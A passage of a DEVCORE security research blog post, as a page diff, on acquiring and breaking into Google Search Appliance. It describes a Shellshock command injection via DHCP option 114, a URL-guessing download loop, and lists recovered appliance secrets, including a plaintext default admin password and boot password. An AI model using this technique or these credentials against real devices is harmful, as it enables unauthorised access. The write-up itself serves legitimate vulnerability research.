@@ -1,0 +1,1581 @@
+
+
+<!DOCTYPE html>
+<html class="no-js sub-menu">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta charset="utf-8" />
+    <link href="/images/favicon.png" rel="icon" size="32x32">
+    <!-- web fullscreen -->
+    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
+    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
+    <meta name="format-detection" content="telephone=no">
+    <title>[REL] A Journey Into Hacking Google Search Appliance | DEVCORE</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <script src="/js/modernizr-custom.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
+    <script src="/js/site.js"></script>
+    <meta name="description" property="og:description" content="The Google Search Appliance (hereinafter referred to as GSA) is an enterprise search device launched by Google in 2002, used for indexing and retrieving internal or public network information" />
+    <meta name="keywords" content="Google,GSA,Blog,research" />
+    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
+    <meta property="og:title" content="[REL] A Journey Into Hacking Google Search Appliance | DEVCORE 戴夫寇爾" />
+    <meta property="og:url" content="https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://devco.re/assets/img/blog/20230707/1.png" />
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="d3vc0r3">
+    <meta name="twitter:title" content="[REL] A Journey Into Hacking Google Search Appliance | DEVCORE 戴夫寇爾">
+    <meta name="twitter:description" content="The Google Search Appliance (hereinafter referred to as GSA) is an enterprise search device launched by Google in 2002, used for indexing and retrieving internal or public network information">
+    <meta name="twitter:creator" content="d3vc0r3">
+    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20230707/1.png">
+    <meta name="twitter:domain" content="devco.re">
+    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
+    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
+    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
+    <meta name='yandex-verification' content='4561963cf1d18fe3' />
+    <meta property="fb:admins" content="120968921404653" />
+
+    <link rel="canonical" href="https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en/"/>
+    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-GHXJ9PS005');
+    </script>
+    <link rel="stylesheet" href="/fonts/inter.css" />
+    <link rel="stylesheet" href="/css/highlighter.css" />
+    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
+</head>
+<body class="en">
+    <!-- 導覽列 start -->
+    <header class="header">
+<div class="container">
+    <!-- logo start -->
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+    </div>
+    <!-- logo end -->
+    <!-- 主選單 start -->
+    <nav class="nav">
+        <ul class="menu">
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Services<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/services/red-team/">
+                            <div class="item">
+
+                                <h2>
+                                    <i class="icon menu service-red-team"></i>
+                                    Red Team Assessment
+                                </h2>
+                                <p class="two-line">
+                                    Perform comprehensive attack simulation from unlimited aspects to achieve the designated drill scenario without impacting enterprise operations.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/penetration-test/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-penetration-test"></i>
+                                    Penetration Testing
+                                </h2>
+                                <p class="two-line">
+                                    Infiltrate designated enterprise systems with hacker mindset and techniques to uncover potential vulnerabilities, assessing the risk of breach or damage to enterprise assets.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-consulting/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-consulting"></i>
+                                    Security Consulting
+                                </h2>
+                                <p class="two-line">
+                                    Assist enterprises in resource distribution and long-term defensive strategy development from the attacker's perspective based on red team assessment.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-training/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-training"></i>
+                                    Security Training
+                                </h2>
+                                <p class="two-line">
+                                    Assist enterprises in defending and preventing incidents efficiently from the attacker's perspective, including response procedures and analysis of attack targets, techniques, and vulnerabilities.
+                                </p>
+                            </div>
+                        </a>
+
+                    </div>
+                </div>
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Research<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/research/overview/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu search-circle"></i>
+                                    Overview
+                                </h2>
+                                <p class="two-line">
+                                    Research leading cybersecurity techniques and trends, perform comprehensive security assessments of enterprise products, and evolve the red team with broad experience.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/awards/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu badge-check"></i>
+                                    Competitions and Awards
+                                </h2>
+                                <p class="two-line">
+                                    Awards from international cybersecurity competitions.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/bug-bounty/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu puzzle"></i>
+                                    Enterprise Vulnerability Reports
+                                </h2>
+                                <p class="two-line">
+                                    Research into the risk of enterprise systems, identify potential weaknesses, and report to vendors.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/talks/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu globe"></i>
+                                    International Conferences
+                                </h2>
+                                <p class="two-line">
+                                    Publish vulnerability research and share security knowledge at international cybersecurity conferences.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/cve/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu view-list"></i>
+                                    CVE List
+                                </h2>
+                                <p class="two-line">
+                                    Uncover and report critical vulnerabilities in leading international products and services.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+
+
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable" href="#">
+                    <span>Company<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/company/about/">
+                        <div class="item">
+                            <h2>
+                                <i class="icon menu company"></i>
+                                Company Overview
+                            </h2>
+                            <p>
+                                DEVCORE was founded by a world-class white hat hacker team, providing cybersecurity services and focusing on Red Team Assessment and Penetration Testing services.
+                            </p>
+                        </div>
+                        </a>
+                        <a href="/en/company/our-team/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu team"></i>
+                                    Team Members
+                                </h2>
+                                <p class="two-line">
+                                    A team of experts with a hacker mindset, exploring new exploitation techniques, and upholding strict morality, self-discipline, and caution.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/history/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu milestone"></i>
+                                    Achievements
+                                </h2>
+                                <p class="two-line">
+                                    The history, research achievements, and award information of DEVCORE.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/csr/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu heart"></i>
+                                    Corporate Social Responsibility
+                                </h2>
+                                <p class="two-line">
+                                    Provide diverse internship channels and scholarship programs to nurture the next generation and promote cybersecurity awareness.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/jobs/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu briefcase"></i>
+                                    Job Opportunities
+                                </h2>
+                                <p class="two-line">
+                                    Join us to secure the world and improve the cybersecurity industry together.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>News<i class="icon arrow_down"></i></span>
+                    <div class="menuItem">
+                        <a href="/en/blog/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu newspaper"></i>
+                                    BLOG
+                                </h2>
+                                <p>
+                                    Latest news
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/media-kit/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu download"></i>
+                                    Media Resources
+                                </h2>
+                                <p>
+                                    Guidelines for the use of the DEVCORE trademark.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/search/">Search</a>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/contact/">Contact</a>
+            </li>
+        </ul>
+    </nav>
+    <!-- 主選單 end -->
+</div>
+
+
+<!-- 手機板選單  start-->
+<nav class="nav-m" id="menu-m">
+    <ul class="menu">
+        <li>
+            <div class="menuLable">
+                <span>Services</span>
+                <div class="menuItem">
+                    <a href="/en/services/red-team/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-red-team"></i>
+                                Red Team Assessment
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/penetration-test/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-penetration-test"></i>
+                                Penetration Testing
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-consulting/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-consulting"></i>
+                                Security Consulting
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-training/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-training"></i>
+                                Security Training
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>Research</span>
+                <div class="menuItem">
+                    <a href="/en/research/overview/" class="fullwidth">
+                        <div class="item">
+                            <h2>Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/awards/">
+                        <div class="item">
+                            <h2>Competitions and Awards</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/bug-bounty/">
+                        <div class="item">
+                            <h2>Enterprise Vulnerability Reports</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/talks/">
+                        <div class="item">
+                            <h2>International Conferences</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/cve/">
+                        <div class="item">
+                            <h2>CVE List</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+
+        <li>
+            <div class="menuLable">
+                <span>Company</span>
+                <div class="menuItem">
+                    <a href="/en/company/about/" class="fullwidth">
+                        <div class="item">
+                            <h2>Company Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/our-team/">
+                        <div class="item">
+                            <h2>Team Members</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/history/">
+                        <div class="item">
+                            <h2>Achievements</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/csr/">
+                        <div class="item">
+                            <h2>Corporate Social Responsibility</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/jobs/">
+                        <div class="item">
+                            <h2>Job Opportunities</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>News</span>
+                <div class="menuItem">
+                    <a href="/en/blog/">
+                        <div class="item">
+                            <h2>BLOG</h2>
+                        </div>
+                    </a>
+                    <a href="/en/media-kit/">
+                        <div class="item">
+                            <h2>Media Resources</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <div class="menuItem">
+                    <a href="/en/search/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon search"></i>
+                                Search
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/contact/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon chat-alt"></i>
+                                Contact
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span><i class="icon translate"></i>Language</span>
+                <div class="menuItem">
+                    <a href="/">
+                    <div class="item">
+                        <h2>中文</h2>
+                    </div>
+                    </a>
+                    <a href="/en">
+                        <div class="item">
+                            <h2>English</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+    </ul>
+</nav>
+<!-- 手機板選單  end-->
+    </header>
+    <!-- 導覽列 end -->
+
+    <!-- tab 選單 start -->
+    <div class="sub-nav">
+        <div class="container">
+            <h1>BLOG</h1>
+            <ul class="tab">
+                <li>
+                    <a href="/en/blog/">All Articles</a>
+                </li>
+                <li>
+                    <a href="/en/blog/category/Tech%20Editorials/">Tech Editorials</a>
+                </li>
+                <li>
+                    <a href="/en/media-kit/">Media Resources</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <!-- tab 選單 end -->
+    
+    <div class="main">
+        <!-- 文章外層layer -->
+        <section class="narrow">
+            <!-- 文章 start -->
+            <article class="article_body">
+                <div class="content">
+                    <a class="category" href="/en/blog/category/Tech Editorials">Tech Editorials</a>
+                    <span class="tag">
+
+                      <a href="/en/blog/tag/Google/">#Google</a> 
+                    </span>
+                    <h1>
+                        [REL] A Journey Into Hacking Google Search Appliance
+                    </h1>
+                    
+                    
+                    <div class="author_detail">
+                        <span class="date">2023-07-07</span>
+                    </div>         
+                    
+                    
+                    <div class="article_img">
+                        <img src="https://devco.re/assets/img/blog/20230707/1.png"/>
+                    </div>
+                    
+
+                    <hr>
+
+                    <!-- 文章內容 -->
+                    <div class="article_content">
+<p><a href="/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en">English Version</a>, <a href="/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/">中文版本</a></p>
+
+<h3 id="tldr">TL;DR</h3>
+
+<ul>
+  <li>GSA Admin console post-authentication Remote Code Execution.</li>
+  <li>GSA Search interface Path traversal.</li>
+  <li>GSA uses Oracle’s Outside-in Technology to convert documents.</li>
+  <li>Google Web services have some fixed URIs that provide information about the service itself.</li>
+</ul>
+
+<h3 id="introduction">Introduction</h3>
+
+<p>The Google Search Appliance (hereinafter referred to as GSA) is an enterprise search device launched by Google in 2002, used for indexing and retrieving internal or public network information. Around 2005, Google introduced the Google Mini for personal and small business use. Later, at the end of 2008, a virtual machine version was launched, called the Virtual Google Search Appliance (hereinafter referred to as VGSA). However, at the end of 2018, Google ended the life cycle of the GSA product and integrated it into the Cloud Search product line.</p>
+
+<h3 id="appliance-and-software-acquisition">Appliance and Software Acquisition</h3>
+
+<p>We managed to purchase a device by searching “Google Search Appliance” on eBay.</p>
+
+<p>Luckily, the first one we bought was a GSA with unerased data:</p>
+
+<p><img src="/assets/img/blog/20230707/1.png" alt="" /></p>
+
+<p>Even now, you can still find devices that are currently being sold.</p>
+
+<p><img src="/assets/img/blog/20230707/2.png" alt="" /></p>
+
+<p>On the other hand, The original public link of vGSA has been removed.
+http://dl.google.com/vgsa/vgsa_20090210.7z [removed]
+http://dl.google.com/vgsa/vgsa_20081028.7z [removed]</p>
+
+<p>We found the file on BitTorrent magnet link:</p>
+
+<p><code class="language-plaintext highlighter-rouge">magnet:?xt=urn:btih:89388ACE8C3B91FDD3A2F86D8CBB78C58A70D992</code></p>
+
+<p>Next, found the link to the old version software from Google Groups:
+https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ</p>
+
+<p><img src="/assets/img/blog/20230707/3.png" alt="" /></p>
+
+<p>The link was:</p>
+
+<p>http://dl.google.com/dl/enterprise/install_bundle-10000622-7.2.0-112.bin [removed]</p>
+
+<p>And we can obtain all version number from:
+<a href="http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;ref_topic=2709671">http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;ref_topic=2709671</a></p>
+
+<p>Guessing the File Naming Rules as <code class="language-plaintext highlighter-rouge">install_bundle-10000(3-digit numbers)-7.(numbers).(numbers)-(numbers).bin</code></p>
+
+<p>And write a shell script to attempt downloading software:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="o">((</span><span class="nv">j</span><span class="o">=</span>622<span class="p">;</span>j&lt;999<span class="p">;</span>+j<span class="o">))</span><span class="p">;</span><span class="k">do for</span><span class="o">((</span><span class="nv">i</span><span class="o">=</span>1<span class="p">;</span>i&lt;444<span class="p">;</span>+i<span class="o">))</span><span class="p">;</span><span class="k">do </span>wget http://dl.google.com/dl/enterprise/install_bundle-10000<span class="nv">$j</span><span class="nt">-7</span>.2.0-<span class="nv">$i</span>.bin<span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="k">done
+for</span><span class="o">((</span><span class="nv">j</span><span class="o">=</span>661<span class="p">;</span>j&lt;999<span class="p">;</span>+j<span class="o">))</span><span class="p">;</span><span class="k">do for</span><span class="o">((</span><span class="nv">i</span><span class="o">=</span>1<span class="p">;</span>i&lt;444<span class="p">;</span>+i<span class="o">))</span><span class="p">;</span><span class="k">do </span>wget http://dl.google.com/dl/enterprise/install_bundle-10000<span class="nv">$j</span><span class="nt">-7</span>.4.0-<span class="nv">$i</span>.bin<span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="k">done
+for</span><span class="o">((</span><span class="nv">j</span><span class="o">=</span>693<span class="p">;</span>j&lt;999<span class="p">;</span>+j<span class="o">))</span><span class="p">;</span><span class="k">do for</span><span class="o">((</span><span class="nv">i</span><span class="o">=</span>1<span class="p">;</span>i&lt;444<span class="p">;</span>+i<span class="o">))</span><span class="p">;</span><span class="k">do </span>wget http://dl.google.com/dl/enterprise/install_bundle-10000<span class="nv">$j</span><span class="nt">-7</span>.6.0-<span class="nv">$i</span>.bin<span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="k">done</span>
+</code></pre></div></div>
+<p>Including the information found through internet search, successfully retrieved the following file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>all_langs-lang-pack-2.1-1.bin
+all_langs-lang-pack-2.2-1.bin
+centos_patch_files-6.0.0-22.bin
+centos_patch_files-6.14.0-28.bin
+centos_patch_files-7.0.14-238.bin
+centos_patch_files-7.2.0-252.bin
+centos_patch_files-7.2.0-264.bin
+centos_patch_files-7.2.0-270.bin
+centos_patch_files-7.2.0-280.bin
+centos_patch_files-7.2.0-286.bin
+install_bundle-10000653-7.2.0-252.bin
+install_bundle-10000658-7.2.0-264.bin
+install_bundle-10000661-7.2.0-270.bin
+install_bundle-10000681-7.4.0-64.bin
+install_bundle-10000685-7.4.0-72.bin
+install_bundle-10000686-7.4.0-74.bin
+install_bundle-10000692-7.4.0-82.bin
+install_bundle-10000762-7.6.0-36.bin
+install_bundle-10000767-7.6.0-42.bin
+install_bundle-10000772-7.6.0-46.bin
+install_bundle-10000781-7.6.0-58.bin
+install_bundle-10000810-7.6.50-30.bin
+install_bundle-10000822-7.6.50-36.bin
+install_bundle-10000855-7.6.50-64.bin
+install_bundle-10000878-7.6.250-12.bin
+install_bundle-10000888-7.6.250-20.bin
+install_bundle-10000901-7.6.250-26.bin
+install_bundle-10000915-7.6.360-10.bin
+install_bundle-10000926-7.6.360-16.bin
+install_bundle-10000967-7.6.512-18.bin
+sw_files-5.0.4-22.bin
+sw_files-6.14.0-28.bin
+sw_files-7.0.14-238.bin
+vm_patch_1_for_504_G22_and_G24_only.bin
+</code></pre></div></div>
+
+<h3 id="vgsa-virtual-google-search-appliance">vGSA (Virtual Google Search Appliance)</h3>
+
+<p>Next, we began research on vGSA. By default, after importing the virtual machine, 
+this system only provides a function for network configuration and doesn’t provide a system shell for operation or use.
+However, because the virtual machine operates within ours own environment,
+it is usually possible to obtain system permissions through the following methods:</p>
+
+<ul>
+  <li>Directly altering unencrypted disk files</li>
+  <li>Modifying the virtual machine memory</li>
+  <li>Booting using CDs or disks from another operating system</li>
+  <li>Exploiting known vulnerabilities</li>
+  <li>Utilizing hard-coded administrator or system account passwords</li>
+</ul>
+
+<p>The following image shows the network configuration screen:</p>
+
+<p><img src="/assets/img/blog/20230707/4.png" alt="" /></p>
+
+<h4 id="cve-2014-6271">CVE-2014-6271</h4>
+
+<p>When testing early Linux appliances and servers, especially those using the RedHat series operating system, 
+there are often Shellshock vulnerabilities, and the 2008 released vGSA is no exception.
+Inserting option 114 in the DHCP server will be set in the environment variable, 
+thereby triggering the vulnerability and executing any command.</p>
+
+<p>The command attempted to be inserted is: 
+<code class="language-plaintext highlighter-rouge">useradd zzzzgsa</code>. 
+This command can be observed to be executed repeatedly, as error messages continue to appear in the console output.</p>
+
+<p><img src="/assets/img/blog/20230707/5.png" alt="" /></p>
+
+<h4 id="vgsa-operation-system-observation">vGSA operation system observation</h4>
+
+<p>After successfully obtaining operating system privileges,
+we can observe the network environment, 
+the running applications, and the file system.
+Here are some insights gained from observing the operating system environment:</p>
+
+<ul>
+  <li>Version number is 5.2.0.G.27.</li>
+  <li>Services are mainly written in C/C++, Java, Python.</li>
+  <li>/export/hda3 seems to be the directory primarily used by the service.</li>
+  <li>/etc/shadow contains the root account with password hash x███████████M.</li>
+  <li>Administration interface listening on port 8000, 8443 with default admin password, j0njlRXpU5CQ.</li>
+  <li>/.gnupg contains ent_box_key public and private keys.</li>
+  <li>/.gnupg contains google_license_key public key.</li>
+  <li>/.ssh/authorized_keys contains two sets of public keys.</li>
+  <li>/root/.ssh/authorized_keys contains one set of public keys.</li>
+  <li>/root/.ssh/ contains two sets of SSH public and private keys.</li>
+  <li>/root/.gnupg/ contains ent_box_key public and private keys.</li>
+  <li>Oracle’s Outside In Technology is used to convert documents into HTML web pages.</li>
+  <li>The Java runtime environment uses a Security Manager for protection.</li>
+  <li>The request for engineer support function uses ppp to build a virtual private network, /etc/ppp/chap-secrets contains account passwords ( z██████c、]███████T  ).</li>
+  <li>The boot menu password in /etc/lilo.conf is cmBalx7.</li>
+  <li>/export/hda3/versionmanager/google_key.symmetric has a string that seems to be used for symmetric encryption.</li>
+  <li>/export/hda3/versionmanager/vmanager_passwd contains two sets of username-password combinations ( admin： M█████████████████████████w=:9██=  google：w█████████████████████████o=:N██= ).</li>
+</ul>
+
+<p>Executable programs with network services are as follows:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Listen Port</th>
+      <th>Process Name</th>
+      <th>Program Language</th>
+      <th>Function</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>ssh</td>
+      <td>C/C++</td>
+      <td>OpenSSH Server</td>
+    </tr>
+    <tr>
+      <td>53</td>
+      <td>named</td>
+      <td>C/C++</td>
+      <td>Bind Named</td>
+    </tr>
+    <tr>
+      <td>953</td>
+      <td>named</td>
+      <td>C/C++</td>
+      <td>Bind Named</td>
+    </tr>
+    <tr>
+      <td>1111</td>
+      <td>webserver_config</td>
+      <td>python</td>
+      <td>Installer</td>
+    </tr>
+    <tr>
+      <td>2100</td>
+      <td>adminrunner.py</td>
+      <td>python</td>
+      <td>admin console backend</td>
+    </tr>
+    <tr>
+      <td>3990</td>
+      <td>monitor</td>
+      <td>C/C++</td>
+      <td>monitor</td>
+    </tr>
+    <tr>
+      <td>4000</td>
+      <td>rtserver</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>4430</td>
+      <td>EnterpriseFrontend</td>
+      <td>Java (with security manager)</td>
+      <td>admin console frontend</td>
+    </tr>
+    <tr>
+      <td>4911</td>
+      <td>borgmon</td>
+      <td>C/C++</td>
+      <td>borgmon</td>
+    </tr>
+    <tr>
+      <td>4916</td>
+      <td>reactor</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>5000</td>
+      <td>rtserver</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>5600</td>
+      <td>rtserver</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>6600</td>
+      <td>cacheserver</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>7800</td>
+      <td>EnterpriseFrontend</td>
+      <td>Java (with security manager)</td>
+      <td>admin console frontend (http)</td>
+    </tr>
+    <tr>
+      <td>7880</td>
+      <td>TableServer</td>
+      <td>Java (with security manager)</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>7882</td>
+      <td>AuthzChecker</td>
+      <td>Java (without security manager)</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>7886</td>
+      <td>tomcat</td>
+      <td>Java</td>
+      <td>tomcat server</td>
+    </tr>
+    <tr>
+      <td>8000</td>
+      <td>EnterpriseAdminConsole</td>
+      <td>Java (without security manager)</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>8443</td>
+      <td>stunnel</td>
+      <td>C/C++</td>
+      <td>redirect http to https</td>
+    </tr>
+    <tr>
+      <td>8888</td>
+      <td>GWS</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>9300</td>
+      <td>oneboxserver</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>9328</td>
+      <td>entspellmixer</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>9400</td>
+      <td>mixserver</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>9402</td>
+      <td>mixserver</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>9448</td>
+      <td>qrewrite</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>9450</td>
+      <td>EnterpriseAdminConsole</td>
+      <td>Java (without security manager )</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>10094</td>
+      <td>enterprise_onebox</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>10200</td>
+      <td>clustering_server</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>11913</td>
+      <td>sessionmanager</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>12345</td>
+      <td>RegistryServer</td>
+      <td>Java (without security manager)</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>19780</td>
+      <td>configmgr/ent_configmgr.py</td>
+      <td>python</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>19900</td>
+      <td>feedergate</td>
+      <td>C/C++</td>
+      <td>extract, transform and feed records</td>
+    </tr>
+    <tr>
+      <td>21200</td>
+      <td>FileSystemGateway</td>
+      <td>Java (with security manager)</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>31300</td>
+      <td>rtserver</td>
+      <td>C/C++</td>
+      <td>unknown</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Despite the presence of so many services, most connections are blocked by iptables. 
+The following are the iptables settings:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Redirect privileged ports.</span>
+<span class="c"># (we listen as nobody, which can't attach to low ports, so redirect to high ports)</span>
+<span class="c">#</span>
+<span class="nt">-A</span> PREROUTING <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 80 <span class="nt">-j</span> REDIRECT <span class="nt">--to-ports</span> 7800
+<span class="nt">-A</span> PREROUTING <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 443 <span class="nt">-j</span> REDIRECT <span class="nt">--to-ports</span> 4430
+<span class="nt">-A</span> PREROUTING <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 444 <span class="nt">-j</span> REDIRECT <span class="nt">--to-ports</span> 4431
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> state <span class="nt">--state</span> ESTABLISHED,RELATED <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 7800 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 7801 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 4430 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 4431 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 19900 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 8000 <span class="nt">-j</span> ACCEPT
